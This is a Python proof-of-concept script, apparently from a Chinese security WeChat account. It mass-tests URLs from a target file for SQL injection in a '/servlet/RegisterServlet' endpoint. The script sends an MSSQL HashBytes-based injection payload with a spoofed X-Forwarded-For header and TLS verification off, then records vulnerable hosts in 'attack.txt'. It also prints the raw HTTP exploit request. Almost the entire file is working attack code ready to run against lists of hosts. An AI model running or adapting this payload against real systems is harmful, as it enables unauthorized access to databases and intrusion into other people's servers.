import requests
import concurrent.futures


def check_vulnerability(target):
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": "127.0.0.1"
    }

    try:
        # print(target)
        res = requests.post(
            f"{target}/servlet/RegisterServlet",
            headers=headers,
            data=r"usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--",
            timeout=5,
            verify=False,
        )
        
        if "e10adc3949ba" in res.text:
            print(f"[+]{target}漏洞存在")
            with open("attack.txt", "a") as fw:
                fw.write(f"{target}\n")
        else:
            print(f"[-]{target}漏洞不存在")
    except Exception as e:
        print(f"[-]{target}访问错误")


if __name__ == "__main__":
    print("------------------------")
    print("微信公众号:知攻善防实验室")
    print("------------------------")
    print("target.txt存放目标文件")
    print("attack.txt存放检测结果")
    print("------------------------")
    print(
        """POC:
POST /servlet/RegisterServlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Connection: close
Content-Length: 85
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip

usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--
    
    """
    )
    print("按回车继续")
    import os

    os.system("pause")
    f = open("target.txt", "r")
    targets = f.read().splitlines()
    # print(targets)

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        executor.map(check_vulnerability, targets)
